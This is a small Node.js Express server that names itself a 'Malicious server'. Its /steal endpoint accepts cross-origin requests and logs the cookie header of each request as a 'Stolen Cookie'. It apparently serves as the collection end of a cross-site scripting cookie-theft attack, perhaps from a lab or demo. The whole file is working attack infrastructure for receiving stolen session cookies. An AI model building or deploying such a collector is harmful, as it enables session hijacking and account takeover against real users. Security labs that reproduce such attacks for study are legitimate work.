const express = require('express');
const cookieParser = require('cookie-parser');
const cors = require('cors')

const app = express();
const port = 3001;

app.use(cors());

app.use(cookieParser());

app.get('/steal', (req, res) => {
  const stolenCookie = req.headers.cookie;
  console.log('Stolen Cookie:', stolenCookie);
  res.send('Cookie received');
});

app.listen(port, () => {
  console.log(`Malicious server is running on http://localhost:${port}`);
});
